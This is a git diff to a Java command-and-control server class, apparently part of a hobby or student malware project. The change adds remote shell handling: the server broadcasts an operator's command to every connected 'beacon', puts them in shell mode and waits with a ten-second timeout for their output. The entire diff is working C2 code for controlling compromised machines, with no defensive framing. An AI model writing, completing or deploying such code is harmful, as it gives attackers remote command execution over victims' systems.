@@ -6,6 +6,7 @@ import java.net.Socket;
 import java.net.SocketException;
 import java.util.HashMap;
 import Servers.Duplexer;
+import Servers.notifyLock;
 
 public class C2Server implements Runnable{
     // Dictionary of all of the longRangeBeacons currently reporting back to the C2
@@ -24,6 +25,11 @@ public class C2Server implements Runnable{
     // String for an IP address of a beacaon attempting to authenticate
     private String attemptedAuthIP;
 
+    // Object used as lock for wait()/notify() to get responses instantly when in a shell
+    private Object shellLock;
+
+    // ID used by threads to make sure that .notify() is not called extra times multiple times
+    private int shellID;
 
     /**
      * Initializes a Command and Control Server to handle connections from Long Range Beacons
@@ -31,6 +37,8 @@ public class C2Server implements Runnable{
      * @throws IOException
      */
     public C2Server() throws IOException{
+        this.shellLock = new Object();
+        this.shellID = 0;
         this.longRangeBeacons = new HashMap<>();
         this.serverSocket = new ServerSocket(1234);
         this.userHandler = new C2ServerUserHandler(this);
@@ -67,6 +75,38 @@ public class C2Server implements Runnable{
             e.printStackTrace();
         }
     }
+
+    public int getShellID(){
+        return shellID;
+    }
+
+    protected void getShellResponse(String command){
+        // Create a new thread that will notify the lock after 10 seconds, just in case we don't receive anything back from the client
+        shellID++;
+        notifyLock backupNotifyLock = new notifyLock(shellLock, this, shellID);
+        Thread backupNotifyLockThread = new Thread(backupNotifyLock);
+        backupNotifyLockThread.start();
+
+        // Distribute the commands
+        for(C2ServerBeaconHandler beaconHandler : longRangeBeacons.values()){
+            beaconHandler.setIsShell(true);
+            beaconHandler.sendToBeacon(command);
+        }
+
+        // Wait for a response, once notified, notify the user handler that it can now continue
+        try{
+            synchronized(shellLock){
+                shellLock.wait();
+            }
+        } catch (InterruptedException e){
+            e.printStackTrace();
+        }
+        
+        // Set each beaconHandler to not notify when it receives a response now
+        for(C2ServerBeaconHandler beaconHandler : longRangeBeacons.values()){
+            beaconHandler.setIsShell(false);
+        }
+    }
     
     @Override
     public void run(){
@@ -100,7 +140,7 @@ public class C2Server implements Runnable{
                     duplexer.close();
                 }else{
                     // Create a new thread to handle each Long Range Beacon
-                    C2ServerBeaconHandler beaconHandler = new C2ServerBeaconHandler(duplexer, IPAddress, this);
+                    C2ServerBeaconHandler beaconHandler = new C2ServerBeaconHandler(duplexer, IPAddress, this, shellLock);
                     Thread beaconHandlerThread = new Thread(beaconHandler);
 
                     // Store IP and Duplexer pointer in the dicitonary
